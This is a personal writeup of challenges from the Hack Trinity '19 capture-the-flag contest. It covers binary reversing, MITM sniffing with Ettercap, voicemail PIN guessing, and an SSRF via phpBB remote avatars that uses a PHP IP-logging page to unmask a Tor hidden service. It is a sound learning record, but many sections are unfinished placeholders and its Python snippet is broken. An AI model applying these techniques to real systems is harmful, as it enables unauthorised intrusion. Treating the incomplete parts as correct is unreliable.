# Hack Trinity '19 Writeups

I had a lot of fun participating in the [Hack Trinity '19 CTF](https://hacktrinity.me/) competition this month. It was  my first time every trying anything like this so I wasn't at all prepared and I had to learn a lot of new skills on-the-fly. Nonetheless, I was fairly pleased with my result and I'll definitely be competing again next year!

Here are some brief writeups for the challenges I managed to solve:

* [Solved Problems](#solved-problems)
	* [Welcome to Hack Trinity](#welcome-to-hack-trinity)
	* [RTFR](#rtfr)
	* [Say no to phishing](#say-no-to-phishing)
	* [Denovo 1](#denovo-1)
	* [Bunny](#bunny)
	* [Book of Kells 1](#book-of-kells-1)
	* [LUAS](#luas)
	* [Trinity Ball 1](#trinity-ball-1)
	* [Welcome](#welcome)
	* [Dust in your eyes?](#dust-in-your-eyes)
	* [GNU](#gnu)
	* [Who Am I?](#who-am-i)
	* [Brew](#brew)
	* [Denovo 2](#denovo-2)
	* [Turing-Lang](#turing-lang)
	* [Big Chungus+3](#big-chungus)
	* [Wise](#wise)
	* [Zippy](#zippy)
	* [Flow](#flow)
	* [Call me maybe](#call-me-maybe)
	* [Not Forgotten](#not-forgotten)
	* [Book of Kells 2](#book-of-kells-2)
	* [Nat a flag](#nat-a-flag)
	* [Denovo 3](#denovo-3)
* [Unsolved Problems](#unsolved-problems)
* [Conclusion](#conclusion)

## Solved Problems

### Welcome to Hack Trinity

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`intro` | `50` | `Very Easy`

#### Challenge::

	If you've never played a Capture-The-Flag competition before, worry not!
	The aim of the game is to find a string of text called a flag
	Usually the flag will be in the form HackTrinity{}, but sometimes it can be a different piece of text
	To receive a free 50 points, enter HackTrinity{well_that_was_a_freebie} in the box below, and click Check.

#### Solution::

Simple enough. Free points.

### RTFR

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`intro` | `75` | `Very Easy`

#### Challenge::

	Oooh, we Trinity students love our rules and procedures.
	We love them so much we included a flag in the rules for this competition. Can you find it?

#### Solution::

Another simple one - no need for an explanation here.

### Say no to phishing

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`misc` | `77` | `Very Easy`

#### Challenge::

	What's our real Twitter handle?

#### Solution::

The last of the "zero-effort" problems, kind of.

###  Denovo 1

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`reversing` | `100` | `Easy`

#### Challenge::

	Denovo is a new startup which develops DRM for games.
	Version 1 is to be released soon, and you've been called in to test its effectiveness...
	Note: Denovo have decided that serial keys for v1 and all future versions look like "XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX", where 'X' is a capital letter.
	Both binaries below are generated from the same code, one is built for ARM platforms and one for x86-64. You can choose whichever you're most comfortable with :)

#### Solution::

On to the real problems. I chose the x86-64 binary because I can execute it on my machine.

I quickly executed it to see how the program worked:

// img here

I then extracted all of the relatively long strings from the binary using the following command:

`strings denovo_v1 | awk 'length($0) > 10'`

Among the output was this string: `//text here`

I ran a `hexdump` on the binary and could see that there was what appeared to be an encoded serial key just before the beginning of the flag.

`//here`

At this point I probably should've disassembled the binary and tried to find the method used to encode the serial key but instead I just did a quick check by hand.

We know that every seventh character in the serial key is a hyphen as they are in the form `XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX`. Since, every seventh character in the encoded key is a `0x??` and the ASCII code for `-` is `0x??`then we can immediately see that each character in the key has simply been shifted right by a single bit.

All that was left to do was throw together a quick Python script and decode the key:

```python
k = "\x00\x00"
o = ""
for c in k:
	out += c << 1
print o
```

This gives us `//here`. If we execute the program and enter this key we receive our flag:

`here`

### Bunny

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`forensics` | `100` | `Medium`

#### Challenge::

	TCD Disinformation Services have been hard at work making sure that any flag-containing media is fully censored.
	Apparently one slipped through... Can you find it?

#### Solution::

The reason I've given this challenge a difficulty of 'medium' rather than 'easy' is because of the sheer amount of time I spent trying to use steganography and other techniques to search for the flag.

I extracted strings, looked through metadata, put it through an MKV decoder, ran a `binwalk` for hidden files, ran colour plane analysis using steganography tools, etc ...

Turns out the answer was right in front of me the whole time.

The title of the file is:

`SGFja1RyaW5pdHl7MXRzX24wdF9qVXNUX2FiMHV0X3RoM192MWRlMH0K`

If we run it through a base64 decoder out pops our flag:

`HackTrinity{1ts_n0t_jUsT_ab0ut_th3_v1de0}`

This challenge took me way longer than it should have ...

### Book of Kells 1

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`darkweb/recon` | `113` | `Very Easy`

#### Challenge::

	Oh noes! Someone's stole the Book of Kells and is auctioning it off on the Dark Web!
	Download the Tor Browser and visit the auction site at http://uxpkyayer253dtcl.onion to find out who's been making bids on this Trinity treasure :O

#### Solution::

This was a simple one. If we visit the hidden service and go to the only thread on the forum we'll find the flag sitting at the bottom:

![Forum](images/03_bok_1.png)

### LUAS

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`blockchain/recon` | `114` | `Easy`

#### Challenge::

 	The Luas website has been hacked again, and a threatening ransom message posted. Can you track down the culprit's real full name? https://luas.hacktrinity.me 

#### Solution::

Visiting the website gives us this Zcash address: `t1gok64PM8APnrSWXgBxboqHrszFYqP5v3L`.

I looked it up on a [Zcash blockchain explorer](https://explorer.zcha.in/) and found an account with only one or two transactions. If we follow their transactions we'll find another account or two with only a handful of transactions. Eventually we reach a account that isn't entirely barren, if we Google their Zcash address we'll find a blog containing the culprit's full name:

`img ehre`

And that's our flag!

### Trinity Ball 1

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`web` | `119` | `Very Easy`

#### Challenge::

	Tickets for Trinity Ball have finally been released! Due to high demand, the organisers have limited tickets to one per person. Can you bypass the restrictions and checkout two tickets at once?
	https://trinityball1.hacktrinity.me

#### Solution::

If we visit the page and click the button we'll be taken to an order page:

![Order page](images/05_tb1_1.png)

We can add an item and then proceed to the checkout. We won't be given our flag, however.

By taking a look at the page's source code we can see that the following GET request is made when we purchase a ticket:

```javascript
fetch("addItemToBasket.php?id=" + id).then(function(res) {
	res.json().then(function(json) {
		refreshBasket();
	})
});
```

If we try and make the following request `https://trinityball1.hacktrinity.me/addItemToBasket.php?id=2` then we'll be told our request is invalid. But if we replace the `2` with a `1` and make the same request multiple times then we'll be able to add as many tickets as we want to our basket.

If we proceed to the checkout we'll be awarded our flag:

`HackTrinity{client_side_is_best_side}`

### Welcome

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`networking` | `120` | `Medium`

#### Challenge:

	Each challenge has a dedicated OpenVPN server ... (instructions for setting up OpenVPN, etc) ... that challenge will be destroyed (and re-created next time you connect).
	Once you're all set up, this challenge should be fairly easy: you should be able to nmap your allocated subnet to find a web server hosting the flag.

#### Solution:

If we install OpenVPN, download the config file and follow the setup instructions closely then we should be able to get connected easily enough.

We can find the IP we need to scan as well as our allocated subnet by running `ifconfig`:

`img here`

Using a [subnet calculator](http://www.subnet-calculator.com/) we can convert the `255.255.255.240` into `28` mask  bits.

Now we can run our scan using nmap `nmap -v -sn 10.0.0.0/28`:

`img here`

If we visit the resulting IP we'll find a web page containing our flag:

`flag`


### Dust in your eyes?

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`crypto/steganography` | `121` | `Easy`

#### Challenge:

	Apparently the flag is in the file hidden.txt but I can't find it, good luck to you!

#### Solution:

If we open the file in Vim we can see a number of suspicious looking characters:

`img here`

These characters include ,  and .

By quickly Googling "... steganography" I found a [handy tool](https://330k.github.io/misc_tools/unicode_steganography.html) to decode the file.

If we paste in the text from the file and click decode we get our flag:

`flag`

### GNU

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`networking` | `130` | `Medium`

#### Challenge:

	You should really listen a bit more.

#### Solution:

This is another OpenVPN challenge so we can just repeat the steps from 'Welcome' when setting up.

The challenge statement made it clear that we'd need to listen to the traffic on our VPN interface. If we open up Wireshark and start listening to the `tap0` interface set up by OpenVPN we'll quickly find our flag:

`img here`

## Who Am I?

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`recon` | `143` | `Medium`

#### Challenge:

	We discovered a GSM audio bug in the president's office. Our counter-surveillance techs have determined that the bug was setup to phone home to +353 89 490 9392. We suspect this number is probably the personal phone number of one of the bad people involved (they're not very smart). Can you use your open-source intelligence gathering skills to discover the real-life identity of the owner of this phone?
	Hint: they use a service used by >1 billion other people

#### Solution:

Due to the hint, I spent quite a while trying to find the flag via Facebook (since the phone number appeared to be registered there). However, if we try to find the phone number on WhatsApp we'll quickly find the flag hidden in the user's profile picture:

`img here`

### Brew

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`misc` | `150` | `Very Easy`

#### Challenge:

	I was trawling through my email the other day to see if I could find any flags and I found a message with this file in my spam box.
	The subject line claimed "FLAG WITHIN!", but I can't make any sense of it.

#### Solution:

The attached file was of the type `cia`. Since I already had the 3DS emulator Citra installed on my laptop this gave the entire thing away. By opening the file in Citra we can get our flag:

![Lenny](images/11_brw_1.png)

This challenge was quite fun!

### Denovo 2

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`reversing` | `175` | `Medium`

#### Challenge:

	After Denovo v1 was released into the wild (despite your warnings) and cracks for the protected games appeared online within the hour, the engineers went back to the drawing board.
	Now they're ready to release Denovo v2. Apparently the new version makes use of a proprietary encryption solution which is UNCRACKABLE. Can you take a look?
	Both binaries below are generated from the same code, one is built for ARM platforms and one for x86-64. You can choose whichever you're most comfortable with :)

#### Solution:

Once again, I downloaded the x86-64 version. I repeated the steps from 'Denovo 1' and found the following data in the `hexdump` output:

`img here`

... to-do

### Turing-Lang

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`programming` | `179` | `Easy`

#### Challenge:

	My friend Urban Turing made a new language and he claims that it is Turing complete, can you run the program he has written in this new language? 

#### Solution:

The name Urban Turing must be a reference to Urban Müller - which means we're probably dealing with Brainfuck. Since we can assume that this program, when run, will print out the flag all we need to do is use a [Brainfuck text generator](https://copy.sh/brainfuck/text.html) to find out what our code *should* look like  and then begin matching and replacing characters. I entered "HackTrinity{" into the generator and got the following:

`-[------->+<]>-.[--->++++<]>+ ...`

Our challenge code looks like:

`#/#######>&<\># /###>&&&&<\>& ...`

We can make the following replacements:

* `#` with `-`
* `/` with `[`
* `&` with `+`
* `\` with `]`
* ` ` with `.`
* `<` and `>` remain the same

The resulting code is:

`-[------->+<]>-.[--->++++<]>+.++.++++++++.>-[--->+<]>-.-[--->+<]>+.---------.+++++.-----.+++++++++++.+++++.++.[->+++++<]>++.----------.+++++.+++++++++++.-.++++++.+[->+++<]>.++++++++++++.+++.+.++++++++.--[->+++<]>.+++++++++++++.-------.+++++++++..[--->+<]>-.++++.`

Which gives us:

`HackTrinity{i_dont_know_lenny}`

### Big Chungus+3

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`programming` | `180` | `Easy`

#### Challenge:

	Some normie sent you some strange code, can you find out how to run it?

#### Solution:

Like the previous challenge, we're dealing with Brainfuck. We do another word replacement:

* `chunga` with `-`
* `fudd` with `[`
* `big` with `>`
* `karen` with `+`
* `chungus` with `<`
* `ricardo` with `]`
* `chunky` with `.`

Remove all whitespace and then run our code through an online compiler:

`HackTrinity{TheseMemesAreSo0O0oLastMonth}`

### Wise

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`networking` | `180` | `Hard`

#### Challenge:

	Hey, it's rude to eavesdrop!


#### Solution:

We setup OpenVPN as before and start scanning with nmap. There are two additional hosts up:

`img here`

Based on the problem statement, as well as the suggestive number of hosts, we can probably assume we've got to implement some sort of man-in-the-middle attack.

I hadn't a clue how to do this so I did some Googling and found out about Ettercap. It was already installed on my Kali maching so I opened it up.

to-do

...

Once we've got Ettercap running we can open up Wireshark and begin listening. Sure enough, there's our flag, as well as a conversation that I spent way too much time listening to:

`img here`

### Zippy

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`forensics` | `184` | `Medium`

#### Challenge:

	This zip file seems to be corrupted, any chance you could recover the flag inside?

#### Solution:

If we run a `binwalk` on the archive it doesn't look at all suspicious. If we extract strings we'll find the name of the file inside: `flag.txt`. However, we can't access the this file because the archive's corrupted.

I moved over to Windows and tried to run the WinRar recovery tool on the archive, but to no avail.

After a bit of investigation I discovered that the header at the start of the archive was actually `00 .. 00`, the header for a `.jar` file, and not `00 .. 00`, the header for a `.zip` file!

By changing the appropriate bytes in a hex editor we can fix the archive and extract our flag:

`flag`

### Flow

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`exploit` | `191` | `Hard`

#### Challenge:

	I set up a server so I can check on the flag for this challenge.
	You can find it at ht3.hacktrinity.me:1337 (to connect using netcat, run nc ht3.hacktrinity.me 1337)
	Don't worry, it's password-protected, so you won't be able to get it.
	Here's the program running on the server (not that it'll help you since I've replaced the password and flag with rubbish):

#### Solution:

This was one was really fun!

### Call me maybe

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`phreaking` | `217` | `Medium`

#### Challenge:

	Miers Porgan has been caught hacking into voicemails again.
	Can you figure out how he got into mine?
	+353 76 680 3900 

#### Solution:

To solve this one you simply needed to use a VoIP app to call the provided number. I used Skype with a free trial. You'll be asked to enter a two-digit voicemail password and will be able to get the flag once you've entered the correct one via trial-and-error:

`12986876283467881467242`

### Not Forgotten

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`forensics` | `231` | `Hard`

#### Challenge:

	A friend of mine keeps a portable Linux install on his USB drive.
	I passed by the other day and saw a flag on his screen, which he quickly alt-tabbed away from.
	Since I really want that flag, I grabbed the drive and made an image of it while he was off at lunch, but I can't seem to find any sign of a flag. Can you help?

#### Solution:

I spent a long time trying to mount the image and bricked a USB in the process - I didn't get anywhere with that endeavour.

Then I ran the following command `strings disk.img | awk 'length($0) > 10'` and searched the output for the word 'flag'.

I found this: `flag.png`!

I used the forensice tool Foremost to extract all png files from the disk image: `foremost -t png -i disk.img`

In the output folder was the image containing our flag:

`img here`

### Book of Kells 2

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`darkweb/forensics` | `237` | `Medium`

#### Challenge:

	The purpose of Tor Hidden Services is to hide the IP address of the server that is hosting the website. However, can you identify the real IP address the forum software is running on?
	Hint: SSRF
	http://uxpkyayer253dtcl.onion
	Enter the flag as an IPv4 address, e.g. 1.33.4.2

#### Solution:

Using the 'SSRF' hint, as well as the fact that the forum uses phpBB I did a bit of research to see if there were any big vulnerabilities out there: [bingo](https://vuldb.com/?id.111233)!

If we create an account via the forum and go to our profile page we can see that the forum allows us to specify a remote avatar:

![Remote avatar](images/20_bok_2.png)

I created a web server that contained a page with the following PHP code:

```php
<?php

    $i = $_SERVER['REMOTE_ADDR'] . "\n";
    $f = fopen('log.txt', 'a');
    fwrite($f, $i);
    fclose($f);

?>
```

If we make this URL look like an image file http://myserver.com/log.php?i=image.png` and then set it as our remote avatar then we'll find the hidden service's IP address in the file `log.txt`.

### Nat a flag

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`networking` | `283` | `Hard`

#### Challenge:

	A guy I know keeps his flags on a private webserver inside his home network. I really want those flags, any chance you could help? (For this challenge you can assume that your allocated subnet is "the internet")

#### Solution:

Once again we carry out the standard OpenVPN setup and run an nmap scan.

...

### Denovo 3

Topic(s) | Points | Difficulty (in my opinion)
---------|--------|-----------
`reversing` | `300` | `Very Hard`

#### Challenge:

	When the "encryption" behind Denovo v2 fell almost as quickly as v1, management decided to fire all of the engineers and start over.
	After months of work, Denovo v3 is finally for prime-time. Did the new team's efforts pay off?
	Both binaries below are generated from the same code, one is built for ARM platforms and one for x86-64. You can choose whichever you're most comfortable with :)

#### Solution:

...

## Unsolved Problems

Unfortunately I didn't manage to solve 'Piconvert', 'Trinity Ball 2', 'PHPOurAdmin' or 'Denovo 4'.

For 'Piconvert' I spent a long time trying to implement a reverse shell by exploiting the ImageTragick vulnerability. However, while I could get the exploit to work in simple ways, I wasn't able to get the reverse shell to connect :(

For 'Denovo 4' I used a tool called sysdig as a workaround for not being able to debug the program itself (using gdb, ltrace, etc). I spent a few hours trying to make heads or tails of the data log and erroneously thought I'd found the serial key. The one I found began with "AHACRY-BB..." but didn't work sadly.

I'm confident that with another day or so of work I would've been able to solve a few of them - but oh well.

## Conclusion

While I was disappointed that I didn't manage to solve all of the problems I was still relatively pleased with my score and position on the leaderboard. It was my first attempt at this sort of thing so hopefully with some practice I'll be able to do better next year!

![Leaderboard](images/25_ldr_1.png)